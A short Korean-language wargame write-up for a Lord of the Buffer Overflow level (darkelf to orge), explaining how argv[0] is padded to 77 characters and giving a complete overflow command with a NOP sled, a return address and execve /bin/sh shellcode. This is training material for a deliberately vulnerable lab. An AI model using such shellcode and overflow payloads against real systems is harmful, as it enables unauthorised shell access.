#week2  
##lob  
###darkelf_to_orge  
orge.c를 분석하면 here is changed!라는 부분에서 argv[0]을 77로 맞추라는 것을 확인가능하다.  
조금 늦었지만 argv는 argum ents vector로서 가변적인 개수의 문자열이라고 한다... 솔직히 뭔 말인지 ㅎㅎ    
검색을 더 해보면 argv[0]은 실행 파일명이 저장된다고 한다 호오옹  
즉 실행 파일명의 길이를 77로 맞추라는 것으로 보입니다.  
77로 맟추려고 다 넣어보다 gdb -q $(python -c 'print("./"+"/"*57+"trge")') 이런 식으로 gdb를 실행했다.  
77을 계산해보면 "./"2자 "/home/darkelf/"이렇게 14자 "orge"4자 이니까 "/"로 나머지 57자를 채워준다.    
이제 앞에서 했듯이 strcpy가 call된 후인 main+283에 브레이크를 걸고 실행한 다음 argv[2]의 주소를 얻는다.    
argv[2]의 주소는 0xbffffbb8인 것을 알 수 있다.    
이제 아래와 같은 명령어로 key를 획득가능하다.  
명령어의 앞쪽은 77를 맞춰주는 모습이고 그 뒤로는 동일하다.    
 $(python -c 'print("/home/darkelf/"+"/"*59+"orge"+" "+"\x90"*44+"\xb8\xfb\xff\xbf"+" "+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")') 


